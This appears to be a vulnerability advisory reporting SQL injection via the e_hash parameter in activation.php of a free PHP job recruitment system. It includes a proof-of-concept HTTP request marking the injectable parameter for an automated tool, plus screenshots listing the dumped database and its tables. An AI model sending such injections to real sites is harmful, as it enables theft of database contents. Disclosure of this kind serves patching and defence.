# job-recruitment-in-php has sql injection vulnerability in activation.php

## supplier 
https://code-projects.org/job-recruitment-in-php-css-javascript-and-mysql-free-download/
## Vulnerability file
/activation.php and e_hash parameter.

## describe

The activation.php file of the job-recruitment-in-php system has an SQL injection vulnerability, and the parameter parameter :e_hash  can be controlled.  This vulnerability allows a malicious attacker to obtain sensitive database information

**Code analysis**    

The e_hash parameter is obtained and passed to the SQL statement for execution without filtering

![image-20241213195740269](https://github.com/user-attachments/assets/8fa60e67-d40e-4307-9d66-3e3d19d52aa1)



## POC

```
GET /activation.php?id=1&e=123456&e_hash=1*&p=1 HTTP/1.1
Host: airecruitmentsystem
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=7l3iuuld59eja5iiqnkaoecjn0
Upgrade-Insecure-Requests: 1
Priority: u=0, i

```

save as  1.txt

**Result**

![image-20241213201658094](https://github.com/user-attachments/assets/80f4bd98-05f1-4a87-a1e3-42b3a3d86b00)

Get databases: owlphin And tables in it.

![image-20241213201627253](https://github.com/user-attachments/assets/4314c675-b9dd-4809-9aca-eb525b3e3326)